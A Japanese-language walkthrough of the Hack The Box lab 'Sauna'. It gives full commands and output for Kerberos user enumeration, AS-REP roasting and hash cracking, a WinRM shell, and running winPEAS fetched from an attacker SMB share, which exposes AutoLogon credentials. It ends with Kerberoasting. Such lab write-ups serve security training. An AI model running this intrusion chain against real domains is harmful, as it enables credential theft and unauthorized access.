https://app.hackthebox.com/machines/Sauna

## STEP 1
```sh
└─$ rustscan -a 10.129.95.180 --no-banner --scripts none
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 10.129.95.180:53
Open 10.129.95.180:80
Open 10.129.95.180:88
Open 10.129.95.180:135
Open 10.129.95.180:139
Open 10.129.95.180:389
Open 10.129.95.180:445
Open 10.129.95.180:464
Open 10.129.95.180:593
Open 10.129.95.180:636
Open 10.129.95.180:3268
Open 10.129.95.180:3269
Open 10.129.95.180:5985
Open 10.129.95.180:9389
Open 10.129.95.180:49668
Open 10.129.95.180:49673
Open 10.129.95.180:49674
Open 10.129.95.180:49676
Open 10.129.95.180:49685
Open 10.129.95.180:49692
10.129.95.180 -> [53,80,88,135,139,389,445,464,593,636,3268,3269,5985,9389,49668,49673,49674,49676,49685,49692]
```
```sh
└─$ nmap -n -Pn -p53,80,88,135,139,389,445,464,593,636,3268,3269,5985,9389,49668,49673,49675,49674,49696 -sV 10.129.95.180
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-23 02:26 EDT
Nmap scan report for 10.129.95.180
Host is up (0.47s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-07-23 13:26:24Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
9389/tcp  open  mc-nmf        .NET Message Framing
49668/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49674/tcp open  msrpc         Microsoft Windows RPC
49675/tcp open  msrpc         Microsoft Windows RPC
49696/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: SAUNA; OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 66.47 seconds
```


## STEP 2
80番にアクセス、従業員っぽい名前を確認
<img src="https://github.com/mylovemyon/hackthebox_images/blob/main/Sauna_01.png">  
従業員の名前をメモ
```sh
└─$ cat userlist.txt 
Fergus Smith
Shaun Coins
Hugo Bear
Bowie Taylor
Sophie Driver
Steven Kerb
```
ワードリストを作成
```sh
└─$ ./username-anarchy -i userlist.txt > user.txt

└─$ head user.txt 
fergus
fergussmith
fergus.smith
fergussm
fergsmit
ferguss
f.smith
fsmith
sfergus
s.fergus
```
クレデンシャルなしでドメイン名「EGOTISTICAL-BANK.LOCAL」を確認
```sh
└─$ netexec ldap 10.129.95.180 -u '' -p '' --get-sid                                          
LDAP        10.129.95.180   389    SAUNA            [*] Windows 10 / Server 2019 Build 17763 (name:SAUNA) (domain:EGOTISTICAL-BANK.LOCAL)
LDAP        10.129.95.180   389    SAUNA            [+] EGOTISTICAL-BANK.LOCAL\: 
LDAP        10.129.95.180   389    SAUNA            Domain SID
```
先ほどのリストを用いてユーザ名を確認したところ、「fsmith」を発見
```sh
└─$ ./kerbrute_linux_amd64 userenum --dc '10.129.95.180' -d 'EGOTISTICAL-BANK.LOCAL' user.txt               

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 07/29/25 - Ronnie Flathers @ropnop

2025/07/29 02:08:04 >  Using KDC(s):
2025/07/29 02:08:04 >   10.129.95.180:88

2025/07/29 02:08:04 >  [+] VALID USERNAME:       fsmith@EGOTISTICAL-BANK.LOCAL
2025/07/29 02:08:10 >  Done! Tested 88 usernames (1 valid) in 6.058 seconds
```
asreproastにより、fsmith のtgsをゲット
```sh
└─$ sudo ntpdate 10.129.95.180                                                                                                  
2025-07-29 09:27:00.899816 (-0400) +25200.607821 +/- 0.170160 10.129.95.180 s1 no-leap
CLOCK: time stepped by 25200.607821

└─$ netexec ldap 10.129.95.180 -u 'EGOTISTICAL-BANK.LOCAL\fsmith' -p '' --asreproast asreproast.txt
LDAP        10.129.95.180   389    SAUNA            [*] Windows 10 / Server 2019 Build 17763 (name:SAUNA) (domain:EGOTISTICAL-BANK.LOCAL)
LDAP        10.129.95.180   389    SAUNA            $krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:1795fcc8fbfb3ecf9ee579038a750bf0$962b94cb5f32cd7cbc367102f9cf919d2948118e444f7f68312dd04460340337115005ac6d7c1c4c0ebfb7d4643d45a63557645f3955f537c214339d1bbb342b05c385c23b22701cdf923efd2bd41cbbb930dbb087ea5af79aaaf64be20294a9f0285e067c91f6edc355a9894ca9f0988557a17dc024cc64ac3bfa98c050905afde3fa48da9ab4b0d272412f624e3bb6d770a08d8e969695777ba288967302d5c384d3fc6fc70a68dd9826e82552f2db655890c3c7965b4e67ff9344c1b4fed86ed27e682e79e11598c374947637b8f2d865ce0725bf58d0d486af0a863c06880911592fa01cb5d9760df94ab7ebb536ed6dabe3d01f85b1d22be62530629bb5
```
クラック成功、fsmithのパスワードはThestrokes23
```sh
└─$ nth -f asreproast.txt --no-banner --no-john                                                                            

$krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:59bee1196843ecf6fcbfe16e736d2f2e$8f2dd9c5a07d9fee96a351010bafbd7c9d2de474aa5ec6925773990cd87534c81d01746c1aeb6a0481f8101b95081746247212fc3918899124294f7c123eb12216a599ce297c617c9d263e02e72d4c5
e148e561af9281a549d8a79445ce0fc5c6a12dd97acee05a8225234eb6da2ec7ffe8821bc78225b9a645ca2bd4bceaa022a11d9550aaef0fe8be1c50271e9bbdc3d3bb8e4c381863a16472bcac8f7da8eccd8a1ad6e2b8c7abc3af275649b0b51bb11ea373a3e8b025c40f63eaae65931bc4c5ca3728
6093cc5034caabf53fd1a384144072569c8ee438fecb0c0f7db5e4a68cc76154807a459b0bf6640979310ce17ff1eb8f38052ef36ea9d6e827870

Most Likely 
Kerberos 5 AS-REP etype 23, HC: 18200 Summary: Used for Windows Active Directory

└─$ hashcat -a 0 -m 18200 asreproast.txt /usr/share/wordlists/rockyou.txt --quiet                                      
$krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:59bee1196843ecf6fcbfe16e736d2f2e$8f2dd9c5a07d9fee96a351010bafbd7c9d2de474aa5ec6925773990cd87534c81d01746c1aeb6a0481f8101b95081746247212fc3918899124294f7c123eb12216a599ce297c617c9d263e02e72d4c5e148e561af9281a549d8a79445ce0fc5c6a12dd97acee05a8225234eb6da2ec7ffe8821bc78225b9a645ca2bd4bceaa022a11d9550aaef0fe8be1c50271e9bbdc3d3bb8e4c381863a16472bcac8f7da8eccd8a1ad6e2b8c7abc3af275649b0b51bb11ea373a3e8b025c40f63eaae65931bc4c5ca37286093cc5034caabf53fd1a384144072569c8ee438fecb0c0f7db5e4a68cc76154807a459b0bf6640979310ce17ff1eb8f38052ef36ea9d6e827870:Thestrokes23
```
5985番ポートが開いていたので、winrmログイン成功！ユーザフラグゲット
```sh
└─$ evil-winrm -i 10.129.95.180 -u fsmith -p Thestrokes23 
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\FSmith\Documents> cat ../Desktop/user.txt
5841274744d39246d6d26509fe76d42a
```


## STEP 3
winpeasで権限昇格を探す  
32ビットか64ビットで動かすか確認、systeminfoが拒否されたので.netで確認、64ビット版で実行しましょ
```powershell
*Evil-WinRM* PS C:\Users\FSmith\Documents> systeminfo
Program 'systeminfo.exe' failed to run: Access is deniedAt line:1 char:1
+ systeminfo
+ ~~~~~~~~~~.
At line:1 char:1
+ systeminfo
+ ~~~~~~~~~~
    + CategoryInfo          : ResourceUnavailable: (:) [], ApplicationFailedException
    + FullyQualifiedErrorId : NativeCommandFailed

*Evil-WinRM* PS C:\Users\FSmith\Documents> [Environment]::Is64BitOperatingSystem
True
```
winpeasを配送して、実行
```sh
└─$ cp /usr/share/peass/winpeas/winPEASx64.exe smb

└─$ impacket-smbserver -smb2support share smb
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
```
```sh
*Evil-WinRM* PS C:\Users\FSmith\Documents> copy \\10.10.16.12\share\winPEASx64.exe .

*Evil-WinRM* PS C:\Users\FSmith\Desktop> .\winPEASx64.exe userinfo quiet
 [!] If you want to run the file analysis checks (search sensitive information in files), you need to specify the 'fileanalysis' or 'all' argument. Note that this search might take several minutes. For help, run winpeass.exe --help
ANSI color bit for Windows is not set. If you are executing this from a Windows terminal inside the host you should run 'REG ADD HKCU\Console /v VirtualTerminalLevel /t REG_DWORD /d 1' and then start a new CMD
Long paths are disabled, so the maximum length of a path supported is 260 chars (this may cause false negatives when looking for files). If you are admin, you can enable it with 'REG ADD HKLM\SYSTEM\CurrentControlSet\Control\FileSystem /v VirtualTerminalLevel /t REG_DWORD /d 1' and then start a new CMD
  WinPEAS-ng by @hacktricks_live

       /---------------------------------------------------------------------------------\                                                                                                                                                  
       |                             Do you like PEASS?                                  |                                                                                                                                                  
       |---------------------------------------------------------------------------------|                                                                                                                                                  
       |         Learn Cloud Hacking       :     training.hacktricks.xyz                 |                                                                                                                                                  
       |         Follow on Twitter         :     @hacktricks_live                        |                                                                                                                                                  
       |         Respect on HTB            :     SirBroccoli                             |                                                                                                                                                  
       |---------------------------------------------------------------------------------|                                                                                                                                                  
       |                                 Thank you!                                      |                                                                                                                                                  
       \---------------------------------------------------------------------------------/                                                                                                                                                  
                                                                                                                                                                                                                                            
  [+] Legend:
         Red                Indicates a special privilege over an object or something is misconfigured
         Green              Indicates that some protection is enabled or something is well configured
         Cyan               Indicates active users
         Blue               Indicates disabled users
         LightYellow        Indicates links

 You can find a Windows local PE Checklist here: https://book.hacktricks.wiki/en/windows-hardening/checklist-windows-privilege-escalation.html
   Creating Dynamic lists, this could take a while, please wait...                                                                                                                                                                          
   - Loading sensitive_files yaml definitions file...
   - Loading regexes yaml definitions file...
   - Checking if domain...
   - Getting Win32_UserAccount info...
Error while getting Win32_UserAccount info: System.Management.ManagementException: Access denied
   at System.Management.ThreadDispatch.Start()                                                                                                                                                                                              
   at System.Management.ManagementScope.Initialize()                                                                                                                                                                                        
   at System.Management.ManagementObjectSearcher.Initialize()                                                                                                                                                                               
   at System.Management.ManagementObjectSearcher.Get()                                                                                                                                                                                      
   at winPEAS.Checks.Checks.CreateDynamicLists(Boolean isFileSearchEnabled)                                                                                                                                                                 
   - Creating current user groups list...
   - Creating active users list (local only)...
  [X] Exception: Object reference not set to an instance of an object.
   - Creating disabled users list...
  [X] Exception: Object reference not set to an instance of an object.
   - Admin users list...
  [X] Exception: Object reference not set to an instance of an object.
   - Creating AppLocker bypass list...
   - Creating files/directories list for search...
        [skipped, file search is disabled]


ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ¹ Users Information ÌÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ

ÉÍÍÍÍÍÍÍÍÍÍ¹ Users
È Check if you have some admin equivalent privileges https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#users--groups
  [X] Exception: Object reference not set to an instance of an object.
  Current user: FSmith
  Current groups: Domain Users, Everyone, Builtin\Remote Management Users, Users, Builtin\Pre-Windows 2000 Compatible Access, Network, Authenticated Users, This Organization, NTLM Authentication
   =================================================================================================

    Not Found

ÉÍÍÍÍÍÍÍÍÍÍ¹ Current User Idle Time
   Current User   :     EGOTISTICALBANK\FSmith
   Idle Time      :     03h:40m:26s:593ms

ÉÍÍÍÍÍÍÍÍÍÍ¹ Display Tenant information (DsRegCmd.exe /status)
   Tenant is NOT Azure AD Joined.

ÉÍÍÍÍÍÍÍÍÍÍ¹ Current Token privileges
È Check if you can escalate privilege using some enabled token https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#token-manipulation
    SeMachineAccountPrivilege: SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED
    SeChangeNotifyPrivilege: SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED
    SeIncreaseWorkingSetPrivilege: SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED

ÉÍÍÍÍÍÍÍÍÍÍ¹ Clipboard text

ÉÍÍÍÍÍÍÍÍÍÍ¹ Logged users
  [X] Exception: Access denied 
    Not Found

ÉÍÍÍÍÍÍÍÍÍÍ¹ Display information about local users
   Computer Name           :   SAUNA
   User Name               :   Administrator
   User Id                 :   500
   Is Enabled              :   True
   User Type               :   Administrator
   Comment                 :   Built-in account for administering the computer/domain
   Last Logon              :   7/30/2025 9:37:14 AM
   Logons Count            :   135
   Password Last Set       :   7/26/2021 9:16:16 AM

   =================================================================================================

   Computer Name           :   SAUNA
   User Name               :   Guest
   User Id                 :   501
   Is Enabled              :   False
   User Type               :   Guest
   Comment                 :   Built-in account for guest access to the computer/domain
   Last Logon              :   1/1/1970 12:00:00 AM
   Logons Count            :   0
   Password Last Set       :   1/1/1970 12:00:00 AM

   =================================================================================================

   Computer Name           :   SAUNA
   User Name               :   krbtgt
   User Id                 :   502
   Is Enabled              :   False
   User Type               :   User
   Comment                 :   Key Distribution Center Service Account
   Last Logon              :   1/1/1970 12:00:00 AM
   Logons Count            :   0
   Password Last Set       :   1/22/2020 10:45:30 PM

   =================================================================================================

   Computer Name           :   SAUNA
   User Name               :   HSmith
   User Id                 :   1103
   Is Enabled              :   True
   User Type               :   User
   Comment                 :
   Last Logon              :   1/1/1970 12:00:00 AM
   Logons Count            :   0
   Password Last Set       :   1/22/2020 10:54:34 PM

   =================================================================================================

   Computer Name           :   SAUNA
   User Name               :   FSmith
   User Id                 :   1105
   Is Enabled              :   True
   User Type               :   User
   Comment                 :
   Last Logon              :   7/30/2025 10:41:58 AM
   Logons Count            :   22
   Password Last Set       :   1/23/2020 9:45:19 AM

   =================================================================================================

   Computer Name           :   SAUNA
   User Name               :   svc_loanmgr
   User Id                 :   1108
   Is Enabled              :   True
   User Type               :   User
   Comment                 :
   Last Logon              :   1/1/1970 12:00:00 AM
   Logons Count            :   0
   Password Last Set       :   1/24/2020 4:48:31 PM

   =================================================================================================


ÉÍÍÍÍÍÍÍÍÍÍ¹ RDP Sessions
    Not Found

ÉÍÍÍÍÍÍÍÍÍÍ¹ Ever logged users
  [X] Exception: Access denied 
    Not Found

ÉÍÍÍÍÍÍÍÍÍÍ¹ Home folders found
    C:\Users\Administrator
    C:\Users\All Users
    C:\Users\Default
    C:\Users\Default User
    C:\Users\FSmith : FSmith [Allow: AllAccess]
    C:\Users\Public
    C:\Users\svc_loanmgr

ÉÍÍÍÍÍÍÍÍÍÍ¹ Looking for AutoLogon credentials
    Some AutoLogon credentials were found
    DefaultDomainName             :  EGOTISTICALBANK
    DefaultUserName               :  EGOTISTICALBANK\svc_loanmanager
    DefaultPassword               :  Moneymakestheworldgoround!

ÉÍÍÍÍÍÍÍÍÍÍ¹ Password Policies
È Check for a possible brute-force 
    Domain: Builtin
    SID: S-1-5-32
    MaxPasswordAge: 42.22:47:31.7437440
    MinPasswordAge: 00:00:00
    MinPasswordLength: 0
    PasswordHistoryLength: 0
    PasswordProperties: 0
   =================================================================================================

    Domain: EGOTISTICALBANK
    SID: S-1-5-21-2966785786-3096785034-1186376766
    MaxPasswordAge: 42.00:00:00
    MinPasswordAge: 1.00:00:00
    MinPasswordLength: 7
    PasswordHistoryLength: 24
    PasswordProperties: DOMAIN_PASSWORD_COMPLEX
   =================================================================================================


ÉÍÍÍÍÍÍÍÍÍÍ¹ Print Logon Sessions

       /---------------------------------------------------------------------------------\                                                                                                                                                  
       |                             Do you like PEASS?                                  |                                                                                                                                                  
       |---------------------------------------------------------------------------------|                                                                                                                                                  
       |         Learn Cloud Hacking       :     training.hacktricks.xyz                 |                                                                                                                                                  
       |         Follow on Twitter         :     @hacktricks_live                        |                                                                                                                                                  
       |         Respect on HTB            :     SirBroccoli                             |                                                                                                                                                  
       |---------------------------------------------------------------------------------|                                                                                                                                                  
       |                                 Thank you!                                      |                                                                                                                                                  
       \---------------------------------------------------------------------------------/  
```

## STEP 4
```sh
└─$ netexec ldap 10.129.95.180 --dns-server '10.129.95.180' -u 'EGOTISTICAL-BANK.LOCAL\fsmith' -p 'Thestrokes23' --bloodhound --collection All
LDAP        10.129.95.180   389    SAUNA            [*] Windows 10 / Server 2019 Build 17763 (name:SAUNA) (domain:EGOTISTICAL-BANK.LOCAL)
LDAP        10.129.95.180   389    SAUNA            [+] EGOTISTICAL-BANK.LOCAL\fsmith:Thestrokes23 
LDAP        10.129.95.180   389    SAUNA            Resolved collection methods: acl, rdp, group, dcom, objectprops, session, psremote, localadmin, container, trusts
LDAP        10.129.95.180   389    SAUNA            Done in 01M 28S
LDAP        10.129.95.180   389    SAUNA            Compressing output into /home/kali/.nxc/logs/SAUNA_10.129.95.180_2025-07-29_100418_bloodhound.zip
```
```sh
└─$ sudo ntpdate 10.129.95.180
2025-07-29 12:01:08.765561 (-0400) +25202.159080 +/- 0.169316 10.129.95.180 s1 no-leap
CLOCK: time stepped by 25202.159080
                                                                                                                                                                                                                                            
└─$ netexec ldap 10.129.95.180 -u 'EGOTISTICAL-BANK.LOCAL\fsmith' -p 'Thestrokes23' --kdcHost '10.129.95.180' --kerberoasting kerberoast.txt
LDAP        10.129.95.180   389    SAUNA            [*] Windows 10 / Server 2019 Build 17763 (name:SAUNA) (domain:EGOTISTICAL-BANK.LOCAL)
LDAP        10.129.95.180   389    SAUNA            [+] EGOTISTICAL-BANK.LOCAL\fsmith:Thestrokes23 
LDAP        10.129.95.180   389    SAUNA            [*] Skipping disabled account: krbtgt
LDAP        10.129.95.180   389    SAUNA            [*] Total of records returned 1
LDAP        10.129.95.180   389    SAUNA            [*] sAMAccountName: HSmith, memberOf: [], pwdLastSet: 2020-01-23 00:54:34.140321, lastLogon: <never>
LDAP        10.129.95.180   389    SAUNA            $krb5tgs$23$*HSmith$EGOTISTICAL-BANK.LOCAL$EGOTISTICAL-BANK.LOCAL\HSmith*$eaab21eeedf28cc639f4331470c3b6a4$12f9f446c481b8347cf1842f02e62023a3533015c76c2522c5a1ba7edc1a3563d3e30a9e9528ffb21a914479053b1c34c600d598f8d803e06b28163d665fca8e90dae3c2e11620db882a4c49a6c4546f2296d89cd7cf3f95c57a64300959a853c4edd1de60a9add4442fdc77e60fd64fe704a5d0abbfa884ceca9e1b1aaf4096c6e86390ed3bd79002a0529cc00f11e7820ef1a3e0a026b4f542a36d32de6c4ee456a4f355d6bc4c4f650f26c958a29e9e056cf399afed6f13cea3349c3fe761cc54b7d11b5dab11f6d17edde52a1cc84b39eb87b5fb89c9beeb81509116b2b48f0bcb0e059a19eb79f4a153c1faa7c7d8ce4b1a03e4daa425eb4c2ae4dbb63e52f36651e152670d55f2cbcfe1a4a9aa60c9e4bdb70a73c7959d20ba9c23d3d5d84bc8c8a26c5a74e6d2a03669b54c1d5b4c878c8f5a2bca11e633cec92610793db42a8b1136063cd8e1d5d31f66193327047eb67484369a7dfc9264ca9c2c11b9bc5f7ab530c14b3f77cbf992db390f63feed06e1e12df9d0049e05ae8bb70225fae338292aaedecfd3df22a3210dcedfc992b3f749e05effab21e59aef4d0fef8ce6103ece79e41d6102ba6d4cfce66b5a791fd772e324363f453fc71be9af476fa8bf370c53e421f2bdd9e4cc6d1f9598e18d862b94da4a2a4fffd98f3d08538698434d0c5e01ea5158ef682cc55f418e940fcf5ec2a4216d6f3f29c4697c7fd8d2db4dbcea686faeceac03fe08bc887849809420161aa2e02ec8c01c91ad2ad8896826b7e3749bd8b82fe944e9c8c4a9744fb83f43b24ac55896b5e0ef910300c2d09e0c5f9442b43d309503fd97ea5c4c5f0a1754c6cf54e32fa8b2e89ffd5145ceeeb88ce0f65b159b534ec302844f2a078486f1c4ae9991b24eb997d669cb3ecd0fc779a824d7eb0264734b381b6dba163ae0f541eae69b9828378eb7ad8cf7400633afb9862ecdc153192bbafb02d976d35e2800761828528af6fecc217440c557a7edac5332596af8f945713f83e7dd6e0dec7c8aef27442487711875310cdf5e73dc881baeb0be1a2b41fda8bd79d17c8dfb6fb8dc2fda578ddac35d30fdfcb3ad99666a304deb5ade3cc72cd009f3febe43213877f93363a58abdb44cd9b4e9f213f2826518ce5de17ec61d3f7e5282631927a840f4773d1e0630e05a4a98d35343b450f79802b51ba5d868d5da441b929291dfd6591b8ee992616735f7e07a813ac26a7a380982bb46633ff4a2d14e18e19f96e1ac1262d37663de8979ecabe654eaad47c90114e7a82e265d52a1e0a369630d74e39432b203d5fb70f0508d37c7bd5ebdb99cb504901ccb8a2ef2c91aab1c69a12a6a1b935972da176671b42c44c172cc6eac0750dcdfaeca79a5b9ed66ade315b4cb69a70b9703f52f37b5
```
```sh
└─$ nth -f kerberoast.txt --no-banner --no-john                                                                                    

$krb5tgs$23$*HSmith$EGOTISTICAL-BANK.LOCAL$EGOTISTICAL-BANK.LOCAL\HSmith*$eaab21eeedf28cc639f4331470c3b6a4$12f9f446c481b8347cf1842f02e62023a3533015c76c2522c5a1ba7edc1a3563d3e30a9e9528ffb21a914479053b1c34c600d598f8d803e06b28163d665fca8e9
0dae3c2e11620db882a4c49a6c4546f2296d89cd7cf3f95c57a64300959a853c4edd1de60a9add4442fdc77e60fd64fe704a5d0abbfa884ceca9e1b1aaf4096c6e86390ed3bd79002a0529cc00f11e7820ef1a3e0a026b4f542a36d32de6c4ee456a4f355d6bc4c4f650f26c958a29e9e056cf399afe
d6f13cea3349c3fe761cc54b7d11b5dab11f6d17edde52a1cc84b39eb87b5fb89c9beeb81509116b2b48f0bcb0e059a19eb79f4a153c1faa7c7d8ce4b1a03e4daa425eb4c2ae4dbb63e52f36651e152670d55f2cbcfe1a4a9aa60c9e4bdb70a73c7959d20ba9c23d3d5d84bc8c8a26c5a74e6d2a0366
9b54c1d5b4c878c8f5a2bca11e633cec92610793db42a8b1136063cd8e1d5d31f66193327047eb67484369a7dfc9264ca9c2c11b9bc5f7ab530c14b3f77cbf992db390f63feed06e1e12df9d0049e05ae8bb70225fae338292aaedecfd3df22a3210dcedfc992b3f749e05effab21e59aef4d0fef8ce
6103ece79e41d6102ba6d4cfce66b5a791fd772e324363f453fc71be9af476fa8bf370c53e421f2bdd9e4cc6d1f9598e18d862b94da4a2a4fffd98f3d08538698434d0c5e01ea5158ef682cc55f418e940fcf5ec2a4216d6f3f29c4697c7fd8d2db4dbcea686faeceac03fe08bc887849809420161aa
2e02ec8c01c91ad2ad8896826b7e3749bd8b82fe944e9c8c4a9744fb83f43b24ac55896b5e0ef910300c2d09e0c5f9442b43d309503fd97ea5c4c5f0a1754c6cf54e32fa8b2e89ffd5145ceeeb88ce0f65b159b534ec302844f2a078486f1c4ae9991b24eb997d669cb3ecd0fc779a824d7eb0264734
b381b6dba163ae0f541eae69b9828378eb7ad8cf7400633afb9862ecdc153192bbafb02d976d35e2800761828528af6fecc217440c557a7edac5332596af8f945713f83e7dd6e0dec7c8aef27442487711875310cdf5e73dc881baeb0be1a2b41fda8bd79d17c8dfb6fb8dc2fda578ddac35d30fdfcb
3ad99666a304deb5ade3cc72cd009f3febe43213877f93363a58abdb44cd9b4e9f213f2826518ce5de17ec61d3f7e5282631927a840f4773d1e0630e05a4a98d35343b450f79802b51ba5d868d5da441b929291dfd6591b8ee992616735f7e07a813ac26a7a380982bb46633ff4a2d14e18e19f96e1a
c1262d37663de8979ecabe654eaad47c90114e7a82e265d52a1e0a369630d74e39432b203d5fb70f0508d37c7bd5ebdb99cb504901ccb8a2ef2c91aab1c69a12a6a1b935972da176671b42c44c172cc6eac0750dcdfaeca79a5b9ed66ade315b4cb69a70b9703f52f37b5

Most Likely 
Kerberos 5 TGS-REP etype 23, HC: 13100 Summary: Used in Windows Active Directory.
```
